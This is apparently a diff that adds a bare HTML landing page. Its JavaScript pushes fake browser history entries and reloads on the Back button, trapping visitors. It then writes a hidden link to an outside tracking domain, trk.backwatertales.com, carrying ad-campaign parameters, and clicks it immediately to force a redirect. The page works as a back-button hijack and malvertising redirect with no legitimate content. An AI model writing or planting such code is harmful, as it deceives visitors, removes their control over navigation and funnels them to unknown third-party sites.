@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+<script language=javascript> 
+var zmid=randomString(32)
+function randomString(len) {
+　　len = len || 32;
+　　var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678oOLl9gqVvUuI1';    
+　　var maxPos = $chars.length;
+　　var pwd = '';
+　　for (i = 0; i < len; i++) {
+　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+　　}
+　　return pwd;
+}
+</script>
+<script type="text/javascript">
+window.history.pushState('go.php?s='+zmid, 'Other Page', 'go.php?s='+zmid);
+window.history.pushState('go.php?s='+zmid, 'Initial Page', 'go.php?s='+zmid);
+</script>
+
+<script type="text/javascript">
+window.addEventListener("popstate", function(e) {
+if(document.URL.indexOf("go.php?s="+zmid) >= 0){
+        document.location.href = document.location;
+}
+});
+</script>
+</head>
+<body>
+<script language=javascript>
+var says=['/c/3011/8?clickid={cid}&cost={visit_cost}&target={target}&source={source}&geo={geo}&visitor_type={visitor_type}&campaign_id={campaign_id}&os={os}&browser={browser}&carrier={carrier}','/c/3011/8?clickid={cid}&cost={visit_cost}&target={target}&source={source}&geo={geo}&visitor_type={visitor_type}&campaign_id={campaign_id}&os={os}&browser={browser}&carrier={carrier}'];var timer=null;var say=document.getElementById('say');function getrand(){var ran=Math.floor(Math.random()*says.length);return says[ran];}
+document.write("<a id='myLink' href='https://trk.backwatertales.com/"+(getrand('say'))+"'>loding......</a>")
+function gourl(){myLink.click();}setTimeout(gourl(),1);
+</script>
+
+</body>
+</html>
